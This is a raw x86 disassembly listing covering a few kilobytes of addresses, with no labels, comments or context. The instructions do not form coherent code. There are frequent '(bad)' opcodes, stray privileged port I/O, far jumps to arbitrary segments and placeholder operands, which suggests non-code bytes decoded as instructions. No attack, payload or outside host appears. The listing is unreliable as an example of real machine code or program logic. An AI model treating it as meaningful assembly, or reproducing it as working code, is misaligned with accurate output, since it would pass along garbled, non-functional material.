  43d9e6:	scas   eax,DWORD PTR es:[edi]
  43d9e7:	and    bh,al
  43d9e9:	sbb    al,0x52
  43d9eb:	xchg   edx,eax
  43d9ec:	push   cs
  43d9ed:	out    0xa,al
  43d9ef:	(bad)  
  43d9f0:	psubsw mm2,QWORD PTR [ebx-0x406a70]
  43d9f7:	xchg   esp,eax
  43d9f8:	xor    eax,0x5137efb7
  43d9fd:	test   DWORD PTR [esi],ecx
  43d9ff:	ins    BYTE PTR es:[edi],dx
  43da00:	bound  eax,QWORD PTR [edi+0x6795efa6]
  43da06:	cmp    ah,al
  43da08:	push   cs
  43da09:	jmp    0xf45a780e
  43da0e:	or     eax,0xfade6674
  43da13:	not    DWORD PTR [ebp+0xec3f37f]
  43da19:	jmp    0x43da1e
  43da1e:	add    BYTE PTR [ecx+0xf3a1b39],bh
  43da24:	cmp    al,0xaf
  43da26:	not    DWORD PTR [ebx-0x54a06a4e]
  43da2c:	ret    
  43da2d:	push   cs
  43da2e:	jmp    0xedd5f9aa
  43da33:	sbb    eax,0xf6a9a0ab
  43da38:	and    dl,ch
  43da3a:	jmp    0x49cffbd2
  43da3f:	or     DWORD PTR [edx],esp
  43da41:	jmp    0x53c2:0x2f3219e6
  43da48:	mov    dl,0x70
  43da4a:	call   0xe5cb1dbe
  43da4f:	xchg   ebx,eax
  43da50:	mov    dl,0x9b
  43da52:	ins    DWORD PTR es:[edi],dx
  43da53:	pop    ecx
  43da54:	dec    ecx
  43da55:	adc    ebp,ecx
  43da57:	xchg   ebx,eax
  43da58:	mov    eax,ds:0x21b266cf
  43da5d:	jmp    0x29e9:0xea2193a1
  43da64:	out    0xd6,eax
  43da66:	fiadd  DWORD PTR [edi+0x6000a1ab]
  43da6c:	les    ebx,FWORD PTR [ecx+eax*4+0x4ecf99]
  43da73:	push   edx
  43da74:	ret    0xb717
  43da77:	js     0x43da6f
  43da79:	repz pop es
  43da7b:	xchg   BYTE PTR [ebx],bh
  43da7d:	ins    BYTE PTR es:[edi],dx
  43da7e:	and    BYTE PTR [ebx+0x75],ah
  43da81:	push   cs
  43da82:	data16 add BYTE PTR [eax],al
  43da85:	add    BYTE PTR [eax],al
  43da87:	add    BYTE PTR [eax-0x5f],ch
  43da8a:	(bad)
  43da8e:	push   cs
  43da8f:	mov    edi,edi
  43da91:	mov    eax,ds:0xd079ffff
  43da96:	stos   DWORD PTR es:[edi],eax
  43da97:	xor    esi,DWORD PTR [eax+0x3fa08cbe]
  43da9d:	mov    ch,0xe
  43da9f:	mov    edi,DWORD PTR [edi+0x7e]
  43daa2:	pop    ss
  43daa3:	xchg   esp,eax
  43daa4:	clc    
  43daa5:	fld    TBYTE PTR cs:[ebx]
  43daa8:	stc    
  43daa9:	mov    ah,0x3c
  43daab:	je     0x43da57
  43daad:	mul    bh
  43daaf:	mov    DWORD PTR [edi+0x7e],edi
  43dab2:	xchg   ecx,eax
  43dab3:	dec    ebp
  43dab4:	and    DWORD PTR [eax],esi
  43dab6:	push   ecx
  43dab7:	add    BYTE PTR [eax],ch
  43dab9:	jae    0x43db35
  43dabb:	mov    edi,DWORD PTR [edi-0x5e]
  43dabe:	and    edx,edi
  43dac0:	scas   al,BYTE PTR es:[edi]
  43dac1:	aam    0x93
  43dac3:	inc    esi
  43dac4:	shr    DWORD PTR [edi],0x58
  43dac7:	pop    eax
  43dac8:	jb     0x43db3e
  43daca:	and    dl,bl
  43dacc:	or     DWORD PTR [edi],ebp
  43dace:	pop    eax
  43dacf:	cmp    dh,ah
  43dad1:	cmp    dl,BYTE PTR [esi+0x11]
  43dad4:	sti    
  43dad5:	lds    ebp,FWORD PTR [ecx-0x6c2550dd]
  43dadb:	dec    esi
  43dadc:	lods   eax,DWORD PTR ds:[esi]
  43dadd:	sub    eax,0x39c64850
  43dae2:	push   cs
  43dae3:	inc    ecx
  43dae4:	call   0x784b:0x90569360
  43daeb:	xchg   DWORD PTR [eax],eax
  43daed:	add    BYTE PTR [eax],al
  43daef:	add    BYTE PTR [eax],al
  43daf1:	mov    WORD PTR [ebp-0x1],fs
  43daf4:	mov    al,0x56
  43daf6:	pop    es
  43daf7:	fwait
  43daf8:	dec    ecx
  43daf9:	pop    eax
  43dafa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dafb:	and    al,0x44
  43dafd:	ss xchg edx,eax
  43daff:	push   ss
  43db00:	inc    esi
  43db01:	fisttp DWORD PTR [ecx]
  43db03:	push   cs
  43db04:	add    BYTE PTR [eax-0x287c328],dl
  43db0a:	jl     0x43db19
  43db0c:	pop    edx
  43db0d:	in     al,dx
  43db0e:	mov    WORD PTR [ecx+0x8],cs
  43db11:	nop
  43db12:	xchg   esp,eax
  43db13:	push   esp
  43db14:	ins    BYTE PTR es:[edi],dx
  43db15:	push   edi
  43db16:	push   eax
  43db17:	jbe    0x43db19
  43db19:	nop
  43db1a:	or     DWORD PTR [esi],ecx
  43db1c:	rcl    esi,0x29
  43db1f:	adc    al,0x0
  43db21:	nop
  43db22:	or     edi,edi
  43db24:	xor    DWORD PTR ds:0x1bf8ef17,0xffffffe8
  43db2b:	dec    esi
  43db2c:	and    DWORD PTR [edx-0x7e],0x17
  43db30:	test   esi,eax
  43db32:	rcl    DWORD PTR [ebx],0xc6
  43db35:	cmp    ecx,DWORD PTR [ebx+eax*1]
  43db38:	(bad)  
  43db39:	mov    edx,0xc0be3b09
  43db3e:	mov    edx,0xade9e824
  43db43:	adc    al,BYTE PTR [eax]
  43db45:	sbb    ebp,eax
  43db47:	pop    esi
  43db48:	test   esi,eax
  43db4a:	mov    ecx,ss
  43db4c:	wbinvd 
  43db4e:	fmul   DWORD PTR [esi-0x18]
  43db51:	stc    
  43db52:	inc    ebp
  43db53:	out    dx,eax
  43db54:	clc    
  43db55:	add    BYTE PTR [eax],al
  43db57:	add    BYTE PTR [eax],al
  43db59:	add    BYTE PTR [ebx],bl
  43db5b:	add    BYTE PTR [ebx-0xf67f8b],dl
  43db61:	sub    BYTE PTR ds:0x37f8eea7,0xaf
  43db68:	add    eax,eax
  43db6a:	imul   esi,DWORD PTR [edx-0x5fbb3b2e],0xffffffbf
  43db71:	add    ecx,DWORD PTR [ecx-0x6ffc9aca]
  43db77:	mov    dl,0x6c
  43db79:	dec    ecx
  43db7a:	cmp    al,0x2b
  43db7c:	mov    ds:0xdf770e1b,al
  43db81:	loopne 0x43db97
  43db83:	dec    ecx
  43db84:	cwde   
  43db85:	stc    
  43db86:	xchg   edi,eax
  43db87:	pop    ds
  43db88:	ins    DWORD PTR es:[edi],dx
  43db89:	xchg   ecx,eax
  43db8a:	xor    ecx,eax
  43db8c:	test   DWORD PTR [ebx],0x8a921fb5
  43db92:	mov    ebx,0x1f796c81
  43db97:	enter  0x3f7,0x15
  43db9b:	xor    BYTE PTR [eax-0x7],bl
  43db9e:	addr16 pop ds
  43dba0:	pusha  
  43dba1:	pop    es
  43dba2:	xchg   esi,eax
  43dba3:	mov    cl,0x41
  43dba5:	mov    ds:0x10f7b281,eax
  43dbaa:	add    al,BYTE PTR [edx]
  43dbac:	pop    edx
  43dbad:	add    eax,0x4644824
  43dbb2:	nop
  43dbb3:	mov    dl,0x72
  43dbb5:	mov    BYTE PTR [ecx],ah
  43dbb7:	inc    esi
  43dbb8:	clc    
  43dbb9:	add    edx,DWORD PTR [eax+0x807a2b]
  43dbbf:	add    BYTE PTR [eax],al
  43dbc1:	add    BYTE PTR [eax],al
  43dbc3:	xor    DWORD PTR [edx-0x2722d509],0xb281a479
  43dbcd:	neg    DWORD PTR [eax-0x47]
  43dbd0:	sub    esp,DWORD PTR [edx]
  43dbd2:	inc    eax
  43dbd3:	adc    ebp,ecx
  43dbd5:	das    
  43dbd6:	pop    es
  43dbd7:	adc    eax,0x3702bf78
  43dbdc:	or     esi,esi
  43dbde:	adc    dl,al
  43dbe0:	sub    cl,BYTE PTR [edx]
  43dbe2:	jo     0x43dc52
  43dbe4:	mov    dl,0xbc
  43dbe6:	mov    ah,0x4d
  43dbe8:	or     BYTE PTR [esi],0x1f
  43dbeb:	in     al,0xb4
  43dbed:	dec    edx
  43dbee:	jmp    0xd5951186
  43dbf3:	sbb    bl,cl
  43dbf5:	lea    esp,ds:0xb55137c4
  43dbfb:	stos   DWORD PTR es:[edi],eax
  43dbfc:	test   dl,ah
  43dbfe:	dec    esi
  43dbff:	iret   
  43dc00:	xor    eax,0x8e65e819
  43dc05:	jmp    0x67e123b9
  43dc0a:	fst    DWORD PTR [ebx+0x6f2e4117]
  43dc10:	sbb    edx,DWORD PTR [eax]
  43dc12:	(bad)  
  43dc13:	neg    DWORD PTR [ebx]
  43dc15:	pop    ecx
  43dc16:	xchg   ebp,eax
  43dc17:	or     al,0x7c
  43dc19:	jbe    0x43dc1b
  43dc1b:	pop    ebx
  43dc1c:	sbb    ch,dl
  43dc1e:	push   cs
  43dc1f:	adc    ebx,DWORD PTR [esi+esi*2-0x6a8f4017]
  43dc26:	xchg   edi,eax
  43dc27:	add    BYTE PTR [eax],al
  43dc29:	add    BYTE PTR [eax],al
  43dc2b:	add    bh,ch
  43dc2d:	aaa    
  43dc2e:	push   ecx
  43dc2f:	mov    cl,0x9
  43dc31:	jb     0x43dc3f
  43dc33:	out    dx,al
  43dc34:	sbb    ch,BYTE PTR [edi+ebp*4]
  43dc37:	call   DWORD PTR [ebx-0x8886a4e]
  43dc3d:	ret    
  43dc3e:	push   cs
  43dc3f:	jmp    0x60b4f7e6
  43dc44:	(bad)  
  43dc45:	je     0x43dbdc
  43dc47:	pop    edi
  43dc48:	repz ret 
  43dc4a:	push   cs
  43dc4b:	jmp    0xdfcb085a
  43dc50:	xchg   ebx,eax
  43dc51:	mov    dl,0x96
  43dc53:	in     eax,0x4
  43dc55:	sbb    eax,0x1dfd498c
  43dc5a:	jmp    0x77e8:0x715e25ee
  43dc61:	xor    eax,DWORD PTR [ebx-0x644d6c17]
  43dc67:	add    BYTE PTR [ebp+0x37],dh
  43dc6a:	jle    0x43dc6c
  43dc6c:	jmp    0x91c26e22
  43dc71:	sub    DWORD PTR [eax+0x6c],edx
  43dc74:	xor    ch,cl
  43dc76:	push   0xfffffff8
  43dc78:	mov    ebx,0xabb90d83
  43dc7d:	mov    cl,0xe
  43dc7f:	add    BYTE PTR [edx],ch
  43dc81:	xchg   edx,eax
  43dc82:	sbb    al,BYTE PTR [eax+esi*1]
  43dc85:	das    
  43dc86:	sahf   
  43dc87:	push   ss
  43dc88:	mov    ecx,0x223d5db1
  43dc8d:	out    0x4a,eax
  43dc8f:	test   DWORD PTR [eax],eax
  43dc91:	add    BYTE PTR [eax],al
  43dc93:	add    BYTE PTR [eax],al
  43dc95:	jnp    0x43dd10
  43dc97:	jnp    0xca2f95cc
  43dc9d:	mov    ds:0x3ac93bb3,al
  43dca2:	enter  0x50a8,0x38
  43dca6:	out    0xf6,eax
  43dca8:	pop    ecx
  43dca9:	and    dh,BYTE PTR [ecx-0x72e074f2]
  43dcaf:	xchg   ebx,eax
  43dcb0:	ds jmp 0xf6dd:0x2f8919f5
  43dcb8:	test   eax,0x8be6ff4a
  43dcbd:	inc    edi
  43dcbe:	ret    0x39ce
  43dcc1:	imul   esp,DWORD PTR [esi],0x47
  43dcc4:	(bad)  
  43dcc6:	test   BYTE PTR [edi+0x5b],0xba
  43dcca:	imul   bl
  43dccc:	pop    esp
  43dccd:	cli    
  43dcce:	xor    ch,BYTE PTR [eax+0xeb147a0]
  43dcd4:	add    BYTE PTR [ebp-0x42],dl
  43dcd7:	xchg   ebx,eax
  43dcd8:	push   esi
  43dcd9:	popf   
  43dcda:	xor    eax,0x29f678dc
  43dcdf:	pop    eax
  43dce0:	cmp    dl,ch
  43dce2:	jmp    0x65d4:0xf89002f2
  43dce9:	nop
  43dcea:	lock iret 
  43dcec:	dec    edi
  43dced:	inc    ecx
  43dcee:	mov    ebp,0xb3b0dfa
  43dcf3:	push   cs
  43dcf4:	test   DWORD PTR [esi-0x49],ecx
  43dcf7:	xchg   edi,eax
  43dcf8:	cmp    DWORD PTR [eax],eax
  43dcfa:	add    BYTE PTR [eax],al
  43dcfc:	add    BYTE PTR [eax],al
  43dcfe:	adc    edx,DWORD PTR [edi-0x1d]
  43dd01:	xchg   BYTE PTR [esi-0x9],cl
  43dd04:	cmc    
  43dd05:	pop    ebp
  43dd06:	ret    
  43dd07:	jnp    0x43dcd4
  43dd09:	test   BYTE PTR [esi-0x6fefba78],al
  43dd0f:	cld    
  43dd10:	xchg   ecx,eax
  43dd11:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43dd13:	jae    0x43dce0
  43dd15:	pop    eax
  43dd16:	mov    al,ds:0xc83554cf
  43dd1c:	mov    esi,0xbebe5ccb
  43dd21:	retf   
  43dd22:	push   esp
  43dd23:	out    0xbe,al
  43dd25:	retf   
  43dd26:	dec    esp
  43dd27:	into   
  43dd28:	mov    esi,0x975f44cb
  43dd2d:	jmp    0x43dcf2
  43dd2f:	fs xchg esi,edi
  43dd32:	or     cl,BYTE PTR ds:0xfb8b
  43dd37:	or     DWORD PTR [esi],ecx
  43dd39:	add    BYTE PTR [eax+0x11744890],dl
  43dd3f:	or     eax,0xa47ff10
  43dd44:	inc    ebx
  43dd45:	and    al,0xb
  43dd47:	cld    
  43dd48:	cmc    
  43dd49:	dec    ecx
  43dd4a:	cmp    eax,0xae84cb05
  43dd4f:	test   DWORD PTR [ebp+0xe0a92f8],ecx
  43dd55:	add    BYTE PTR [edi-0x778570e1],ah
  43dd5b:	or     DWORD PTR [ebx],ebx
  43dd5d:	test   bl,ah
  43dd5f:	or     cl,BYTE PTR [esi]
  43dd61:	add    BYTE PTR [eax],al
  43dd63:	add    BYTE PTR [eax],al
  43dd65:	add    BYTE PTR [eax],al
  43dd67:	or     eax,0x140cb0b3
  43dd6c:	add    dh,bh
  43dd6e:	add    edx,DWORD PTR [eax-0x6f9bc60d]
  43dd74:	mov    dl,0xf7
  43dd76:	add    esp,DWORD PTR [ebp+0x1b]
  43dd79:	cmc    
  43dd7a:	or     al,0x5e
  43dd7c:	push   eax
  43dd7d:	clc    
  43dd7e:	add    edx,DWORD PTR [eax+0x13703a27]
  43dd84:	repz enter 0x2087,0xb3
  43dd89:	test   DWORD PTR [ebx],0x12f8515
  43dd8f:	loopne 0x43dd3c
  43dd91:	mov    DWORD PTR [ecx-0x57],ecx
  43dd94:	sub    eax,0xf0a4dcb6
  43dd99:	loopne 0x43dd30
  43dd9b:	xchg   edi,edx
  43dd9d:	sbb    al,0x56
  43dd9f:	sbb    ebp,DWORD PTR [ebx-0x2770c497]
  43dda5:	sub    al,0x56
  43dda7:	add    ebp,DWORD PTR [ecx+ecx*2+0x38307e3b]
  43ddae:	add    DWORD PTR [ebp-0x10967519],edi
  43ddb4:	lock cmc 
  43ddb6:	add    dl,BYTE PTR [eax-0x386a1f4e]
  43ddbc:	mov    cl,0xb7
  43ddbe:	sbb    BYTE PTR [ebp-0x5b],cl
  43ddc1:	mov    ah,0xc
  43ddc3:	add    bh,BYTE PTR [edx-0xa]
  43ddc6:	inc    ebx
  43ddc7:	jge    0x43ddb0
  43ddc9:	dec    edx
  43ddca:	push   ds
  43ddcb:	add    BYTE PTR [eax],al
  43ddcd:	add    BYTE PTR [eax],al
  43ddcf:	add    BYTE PTR [ecx-0x2ffaaf9c],cl
  43ddd5:	xlat   BYTE PTR ds:[ebx]
  43ddd6:	lods   al,BYTE PTR ds:[esi]
  43ddd7:	push   ecx
  43ddd8:	jg     0x43dd85
  43ddda:	cmp    DWORD PTR [edi+eiz*1],0xa2cf0cdb
  43dde1:	retf   0x91f8
  43dde4:	mov    edi,0xaf290eb1
  43dde9:	cmc    
  43ddea:	arpl   si,cx
  43ddec:	call   0xd5e5:0x53e84760
  43ddf3:	adc    al,0x2
  43ddf5:	stos   BYTE PTR es:[edi],al
  43ddf6:	mov    al,ds:0x25729531
  43ddfb:	mov    ds:0x3f19a741,al
  43de00:	pushf  
  43de01:	sbb    ebp,DWORD PTR [edx]
  43de03:	ret    0x9fc6
  43de06:	adc    dh,BYTE PTR [edx-0x3d5d732b]
  43de0c:	int    0xaf
  43de0e:	or     al,0xe8
  43de10:	xchg   ebx,eax
  43de11:	mov    dl,0x97
  43de13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43de14:	xor    esp,DWORD PTR [ebp+0x10]
  43de17:	jmp    0x266990af
  43de1c:	inc    edx
  43de1d:	mov    ah,0x97
  43de1f:	(bad)  
  43de20:	xor    edx,DWORD PTR ds:0xb28d8214
  43de26:	push   cs
  43de27:	jmp    0xeab27a42
  43de2c:	push   ss
  43de2d:	inc    esp
  43de2e:	scas   eax,DWORD PTR es:[edi]
  43de2f:	call   DWORD PTR [ebx+0x945cb2]
  43de35:	add    BYTE PTR [eax],al
  43de37:	add    BYTE PTR [eax],al
  43de39:	add    eax,0x1a626e74
  43de3e:	push   esi
  43de3f:	add    ecx,ebp
  43de41:	xchg   ebx,eax
  43de42:	(bad)  
  43de43:	or     eax,0x97943f72
  43de48:	mov    ebp,0x49992f9c
  43de4d:	inc    edx
  43de4e:	sbb    ch,dl
  43de50:	(bad)  
  43de52:	inc    ecx
  43de53:	add    ecx,ebp
  43de55:	xchg   ebx,eax
  43de56:	sub    dl,BYTE PTR [ebx]
  43de58:	repz mov WORD PTR [edi+ebp*4],?
  43de5c:	call   DWORD PTR [ebx-0x1c68e64e]
  43de62:	stos   BYTE PTR es:[edi],al
  43de63:	mov    al,ds:0x33d5ab00
  43de68:	inc    eax
  43de69:	sub    DWORD PTR [ecx+ebp*8+0xd9d7f9b],edx
  43de70:	add    cl,bh
  43de72:	sub    cl,BYTE PTR [esi-0x15e5ee7a]
  43de78:	jmp    esi
  43de7a:	inc    ebx
  43de7b:	or     eax,0xe75d020
  43de80:	data16 clc 
  43de82:	mov    eax,ds:0xb5e0888f
  43de87:	push   cs
  43de88:	mov    esp,DWORD PTR [edi-0x5f]
  43de8b:	(bad)  
  43de8c:	(bad)  
  43de8d:	mov    ecx,0xd2605028
  43de92:	call   0x2cb4b0d1
  43de97:	mov    dl,BYTE PTR [esi]
  43de99:	test   eax,0x46cfb5
  43de9e:	add    BYTE PTR [eax],al
  43dea0:	add    BYTE PTR [eax],al
  43dea2:	fnstenv [ebp-0x5346fff2]
  43dea8:	add    dl,0x80
  43deab:	je     0x43df0f
  43dead:	add    edi,ebp
  43deaf:	xchg   ecx,eax
  43deb0:	xchg   ebx,eax
  43deb1:	retf   0xe2d2
  43deb4:	xchg   ebx,eax
  43deb5:	dec    esi
  43deb6:	inc    ebp
  43deb7:	sub    BYTE PTR [eax+0x38],dl
  43deba:	add    ebx,DWORD PTR [edx]
  43debc:	adc    cl,BYTE PTR [ebx+0x39e7]
  43dec2:	jns    0x43de84
  43dec4:	out    0x66,eax
  43dec6:	lock rcr DWORD PTR [ecx-0x75],0xe7
  43decb:	push   ebp
  43decc:	add    BYTE PTR [eax],al
  43dece:	imul   ebp,DWORD PTR [eax],0xb56f9880
  43ded4:	push   cs
  43ded5:	mov    BYTE PTR ds:0x99de9a7,ch
  43dedb:	and    al,0xea
  43dedd:	jmp    DWORD PTR [esi]
  43dedf:	inc    ebx
  43dee0:	fisub  DWORD PTR [esi-0x70]
  43dee3:	or     ah,BYTE PTR [edx-0x6f]
  43dee6:	cld    
  43dee7:	or     cl,BYTE PTR [esi]
  43dee9:	add    BYTE PTR ds:0x90935c87,cl
  43deef:	or     ecx,DWORD PTR [esi]
  43def1:	test   DWORD PTR [esi],edx
  43def3:	jg     0x43ded1
  43def5:	inc    DWORD PTR [edi]
  43def7:	mov    ah,0xd3
  43def9:	sub    al,0xc9
  43defb:	adc    DWORD PTR [eax+0xe0b9e9f],edx
  43df01:	or     DWORD PTR [edx+ecx*2],eax
  43df04:	enter  0x49,0x0
  43df08:	add    BYTE PTR [eax],al
  43df0a:	add    BYTE PTR [edx+ecx*1+0x28],bl
  43df0e:	ins    BYTE PTR es:[edi],dx
  43df0f:	adc    eax,0x51841862
  43df14:	cdq    
  43df15:	xbegin 0x836ab036
  43df1b:	fldenv [edx]
  43df1d:	jne    0xbf57b279
  43df23:	stos   DWORD PTR es:[edi],eax
  43df24:	or     al,0x3
  43df26:	rcr    BYTE PTR [ebx],0x59
  43df29:	jb     0x43df91
  43df2b:	nop
  43df2c:	mov    ah,0x9d
  43df2e:	dec    ebp
  43df2f:	inc    eax
  43df30:	cmp    esi,esi
  43df32:	in     eax,dx
  43df33:	cmp    BYTE PTR [ebx],cl
  43df35:	push   cs
  43df36:	test   esi,edx
  43df38:	in     eax,dx
  43df39:	call   0xd686:0xe2ce1339
  43df40:	in     eax,dx
  43df41:	cmc    
  43df42:	cmp    eax,0x84c7b981
  43df47:	sahf   
  43df48:	mov    WORD PTR [ebp+0x10],es
  43df4b:	nop
  43df4c:	clc    
  43df4d:	push   0xc7b15e01
  43df52:	pop    eax
  43df53:	mov    ds:0x535b2bc9,eax
  43df58:	lea    eax,[ecx+0x8]
  43df5b:	mov    eax,ss
  43df5d:	mov    WORD PTR [ebx+0x3f7b2a6],?
  43df63:	nop
  43df64:	mov    dl,0xf7
  43df66:	add    esp,DWORD PTR [ebx-0x3bb69329]
  43df6c:	sub    eax,0x5baf
  43df71:	add    BYTE PTR [eax],al
  43df73:	add    BYTE PTR [ecx+0x151c3a2b],dl
  43df79:	repz mov esp,0x6cf2bd05
  43df7f:	xor    DWORD PTR [ebx+eax*4+0xc],esi
  43df83:	mov    bl,0x4d
  43df85:	sub    BYTE PTR [ecx],0xec
  43df88:	adc    eax,0x1503f77b
  43df8d:	jno    0x43dfa2
  43df8f:	lea    ebp,[ecx+0x16f3b433]
  43df95:	jno    0x43dfca
  43df97:	in     al,dx
  43df98:	in     eax,0x22
  43df9a:	imul   ebx,eax,0xc3a4a914
  43dfa0:	jle    0x43e013
  43dfa2:	(bad)  
  43dfa3:	cmp    BYTE PTR [ecx+0x353c383d],cl
  43dfa9:	repnz cmc 
  43dfab:	ss in  eax,dx
  43dfad:	xor    eax,DWORD PTR [edx-0x84d7e5d]
  43dfb3:	add    esp,DWORD PTR [ebx+ebx*8]
  43dfb6:	pop    esp
  43dfb7:	dec    ecx
  43dfb8:	xor    al,0x2d
  43dfba:	pop    ds
  43dfbb:	pop    ebx
  43dfbc:	xchg   ecx,eax
  43dfbd:	sub    edi,DWORD PTR [edx+0x4cf2851b]
  43dfc3:	add    eax,0x315cf2ad
  43dfc8:	in     al,0x8c
  43dfca:	imul   DWORD PTR [edi+ebx*2]
  43dfcd:	test   BYTE PTR [edi-0x608687cf],ah
  43dfd3:	add    edx,DWORD PTR [eax+0x67ba2b]
  43dfd9:	add    BYTE PTR [eax],al
  43dfdb:	add    BYTE PTR [eax],al
  43dfdd:	or     eax,0x9fbf74d8
  43dfe2:	sub    DWORD PTR [edi],ecx
  43dfe4:	scas   eax,DWORD PTR es:[edi]
  43dfe5:	jg     0x43dff1
  43dfe7:	mov    eax,0x961a67f9
  43dfec:	not    DWORD PTR [edx]
  43dfee:	mov    al,ds:0x2e96e8fe
  43dff3:	jb     0x43dfcb
  43dff5:	aas    
  43dff6:	sbb    cl,BYTE PTR [edx+0x62]
  43dff9:	push   ebx
  43dffa:	jle    0x43e047
  43dffc:	stos   BYTE PTR es:[edi],al
  43dffd:	dec    eax
  43dffe:	jmp    0x43dfda
  43e000:	lods   eax,DWORD PTR ds:[esi]
  43e001:	fsubr  st,st(2)
  43e003:	ficomp DWORD PTR [ebx+ebx*1]
  43e006:	or     eax,DWORD PTR [edx+0x6a]
  43e009:	data16 sahf 
  43e00b:	push   cs
  43e00c:	sbb    al,0xfd
  43e00e:	sub    eax,0x53791e9
  43e013:	jmp    0x96e9:0x62991396
  43e01a:	cs mov bl,0xe9
  43e01d:	xchg   ebx,eax
  43e01e:	mov    dl,0x95
  43e020:	daa    
  43e021:	cmp    BYTE PTR ds:0x411ab159,ch
  43e027:	scas   eax,DWORD PTR es:[edi]
  43e028:	xlat   BYTE PTR ds:[ebx]
  43e029:	xchg   ebx,eax
  43e02a:	mov    dl,0xd1
  43e02c:	scas   eax,DWORD PTR es:[edi]
  43e02d:	xor    esi,DWORD PTR [edx+0x3093e90e]
  43e033:	adc    esp,ecx
  43e035:	sbb    ch,BYTE PTR [ecx]
  43e037:	mov    bl,0xf7
  43e039:	xchg   ebx,eax
  43e03a:	mov    dl,0x1d
  43e03c:	inc    esi
  43e03d:	ss das 
  43e03f:	sub    ebx,DWORD PTR [eax+0x0]
  43e045:	add    BYTE PTR [edx],bl
  43e047:	sub    al,0xaf
  43e049:	fist   WORD PTR [ebx-0x3a86a4e]
  43e04f:	ret    
  43e050:	push   cs
  43e051:	jmp    0xee589261
  43e056:	sbb    eax,0x93e8a7e6
  43e05b:	mov    dl,0xe
  43e05d:	call   0x451677
  43e062:	imul   esi,DWORD PTR [edx-0x7b42fe94],0xb239007d
  43e06c:	jmp    0x58409dbe
  43e071:	je     0x43e02f
  43e073:	xchg   ebp,eax
  43e074:	jg     0x43e00a
  43e076:	cmp    DWORD PTR [edx-0x625874f2],esi
  43e07c:	(bad)  
  43e07d:	jmp    FWORD PTR [ecx]
  43e07f:	sub    DWORD PTR [eax+0x6c],edx
  43e082:	sbb    BYTE PTR [edi+0x21],0x96
  43e086:	sbb    DWORD PTR [eax],ecx
  43e088:	jmp    0x8d56:0x9330c4ff
  43e08f:	xor    ebx,esp
  43e091:	js     0x43e079
  43e093:	sub    BYTE PTR [eax+0x38],bl
  43e096:	cli    
  43e097:	jmp    0x43e08b
  43e099:	add    cl,dl
  43e09b:	out    0x73,al
  43e09d:	add    dl,dl
  43e09f:	repz pop ecx
  43e0a1:	push   ecx
  43e0a2:	ja     0x43e0aa
  43e0a4:	pushf  
  43e0a5:	push   edi
  43e0a6:	mov    ecx,0x4693b1
  43e0ab:	add    BYTE PTR [eax],al
  43e0ad:	add    BYTE PTR [eax],al
  43e0af:	lea    ebp,[ecx]
  43e0b1:	sub    BYTE PTR [ebx+0x469121f5],al
  43e0b7:	int    0x9
  43e0b9:	int3   
  43e0ba:	out    dx,eax
  43e0bb:	dec    esi
  43e0bc:	cld    
  43e0bd:	xchg   edx,eax
  43e0be:	push   cs
  43e0bf:	cmp    dh,BYTE PTR [esi-0x2]
  43e0c2:	(bad)  
  43e0c3:	mov    esi,0x4eff5432
  43e0c8:	cld    
  43e0c9:	cmp    al,al
  43e0cb:	fisubr DWORD PTR cs:[ebx-0x7256cb75]
  43e0d2:	rol    BYTE PTR [ebp-0x1b],0xce
  43e0d6:	xchg   ch,dl
  43e0d8:	pop    es
  43e0d9:	jmp    0x9000:0xeb179ff
  43e0e0:	mov    ch,al
  43e0e2:	add    esp,ebp
  43e0e4:	in     al,0x94
  43e0e6:	dec    ecx
  43e0e7:	mov    ah,0x86
  43e0e9:	fidiv  DWORD PTR [edi-0x69]
  43e0ec:	mov    al,ds:0xca93382b
  43e0f1:	hlt    
  43e0f2:	std    
  43e0f3:	or     bl,0x94
  43e0f6:	push   ecx
  43e0f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e0f8:	or     DWORD PTR ds:0x22d94125,0x3bbf3852
  43e102:	add    BYTE PTR [eax+0xb6c2890],dl
  43e108:	lods   eax,DWORD PTR ds:[esi]
  43e109:	pop    ebx
  43e10b:	mov    al,ds:0xf85c28a2
  43e110:	mov    ?,ebx
  43e112:	clc    
  43e113:	add    BYTE PTR [eax],al
  43e115:	add    BYTE PTR [eax],al
  43e117:	add    bh,bh
  43e119:	(bad)  
  43e11a:	adc    BYTE PTR ds:0x104d11d0,ch
  43e120:	dec    edi
  43e121:	add    al,0x79
  43e123:	mov    edi,0x5b0d4b13
  43e128:	rol    DWORD PTR [edi+0xb7e9f80],cl
  43e12e:	push   cs
  43e12f:	add    BYTE PTR [eax+esi*8-0x6a],al
  43e133:	dec    ecx
  43e134:	fs xchg ch,dl
  43e137:	ja     0x43e0d0
  43e139:	nop
  43e13a:	sub    BYTE PTR [eax],bh
  43e13c:	xchg   ebx,eax
  43e13d:	retf   0xfdf7
  43e140:	(bad)  
  43e141:	retf   
  43e142:	xchg   edi,eax
  43e143:	push   ecx
  43e144:	xor    al,0xf1
  43e146:	or     eax,0x1e58c125
  43e14b:	push   edx
  43e14c:	test   al,0xd6
  43e14e:	cmp    BYTE PTR [eax],al
  43e150:	nop
  43e151:	mov    al,ds:0x1c1b6c28
  43e156:	pop    ebx
  43e158:	mov    al,ds:0x685c2892
  43e15d:	mov    bl,0xbb
  43e15f:	in     al,0x68
  43e161:	adc    al,0x5d
  43e163:	push   es
  43e164:	in     eax,0x99
  43e166:	out    0x3,eax
  43e168:	mov    DWORD PTR [esi],ebp
  43e16a:	xchg   esi,eax
  43e16b:	aam    0x58
  43e16d:	adc    al,0x50
  43e16f:	add    edx,DWORD PTR [eax-0x14cb084e]
  43e175:	out    dx,eax
  43e176:	mov    cl,BYTE PTR [eax+0x4f6c7d2b]
  43e17c:	add    BYTE PTR [eax],al
  43e17e:	add    BYTE PTR [eax],al
  43e180:	add    BYTE PTR [eax-0x3213d685],cl
  43e186:	add    al,0xc9
  43e188:	aam    0xc
  43e18a:	sbb    edi,DWORD PTR [ebx-0x2c]
  43e18d:	mov    ds:0x744d6ca8,al
  43e192:	or     ch,BYTE PTR [ebx+edx*8+0x8]
  43e196:	adc    al,0x5d
  43e198:	mov    esp,0xc2027468
  43e19d:	xchg   ebx,eax
  43e19e:	mov    dl,0x8b
  43e1a0:	(bad)  
  43e1a1:	retf   
  43e1a2:	out    0xa3,al
  43e1a4:	(bad)  
  43e1a5:	(bad)  
  43e1a7:	mov    ebx,0x2ae6dbc7
  43e1ac:	mov    ebx,ebp
